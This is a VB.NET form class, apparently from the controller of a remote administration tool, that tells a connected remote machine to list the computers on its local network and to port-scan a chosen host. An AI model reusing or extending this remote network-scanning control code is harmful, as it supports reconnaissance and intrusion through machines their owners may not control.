Public Class Lan
    Public sock As Integer
    Sub Reforge() '300--> 150 --> 80 --> 40 --> 190
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 317)

        Me.Refresh()
        Return
    End Sub
    Public pcipz As String
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label2.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Main.S.Send(sock, "Stoplan")
        Me.Close()
    End Sub



#End Region

    Private Sub Lan_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        LoaderMax.Start()
    End Sub
    Private Sub ListView1_DoubleClick(sender As System.Object, e As System.EventArgs) Handles ListView1.DoubleClick
        Dim pcname As String = ListView1.FocusedItem.SubItems.Item(0).Text
        Main.S.Send(sock, "enterlan" & Main.Yy & pcname)
    End Sub

    Private Sub LaodM()
        ListView1.Items.Clear()
        Main.S.Send(sock, "getlan")

    End Sub
    Dim Curr As Double = 0.0
    Private Sub LoaderMax_Tick(sender As System.Object, e As System.EventArgs) Handles LoaderMax.Tick
        '635
        If Curr < 634 Then
            Curr += 63.5
            Me.Size = New Size(Me.Width, Curr)
        Else
            LoaderMax.Stop()
            Reforge()
            LaodM()
            Exit Sub
        End If
    End Sub
    
  
#Region "Drag2"

    Dim ItemposX As Integer
    Dim ItemposY As Integer
    Dim Itemdrag As Boolean



    Private Sub ListView1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles ListView1.MouseDown
        If e.Button = MouseButtons.Left Then
            Itemdrag = True
            ItemposX = Cursor.Position.X - ListView1.Left
            ItemposY = Cursor.Position.Y - ListView1.Top
        End If
    End Sub

    Private Sub ListView1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles ListView1.MouseUp
        Itemdrag = False
    End Sub

    Private Sub ListView1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles ListView1.MouseMove
        If Itemdrag Then
      
            If ListView1.SelectedItems.Count = 1 Then
                If ListView1.SelectedItems(0).ImageIndex = 0 Or ListView1.SelectedItems(0).ImageIndex = 5 Then
                    Exit Sub
                Else

                ListView1.SelectedItems(0).Position = New Point(Cursor.Position.X - ItemposX, Cursor.Position.Y - ItemposY)

                End If
            End If
        End If
        ListView1.Cursor = Cursors.Default
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        On Error Resume Next

        If ListView1.SelectedItems.Count = 1 Then
            Dim pcname As String = ListView1.FocusedItem.SubItems.Item(0).Text
            Main.S.Send(sock, "enterlan" & Main.Yy & pcname)
            ListView1.SelectedItems(0).Position = New Point(Cursor.Position.X, Cursor.Position.Y) 'Cursor.Position.Y - ItemposY
            If ListView1.SelectedItems(0).ImageIndex = 8 Then
                ListView1.SelectedItems(0).Selected = False
            Else
                Button3.Enabled = True
            End If

        Else
            Button3.Enabled = False
        End If

    End Sub
   


#End Region

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        ListView2.Items.Clear()

        Dim port1 = InputBox("Enter Start Port")
        Dim port2 = InputBox("Enter Start Port")
        Dim pcname As String = ListView1.FocusedItem.SubItems.Item(0).Text
        Main.S.Send(sock, "scanlan" & Main.Yy & pcname & Main.Yy & port1 & Main.Yy & port2)
    End Sub

   
End Class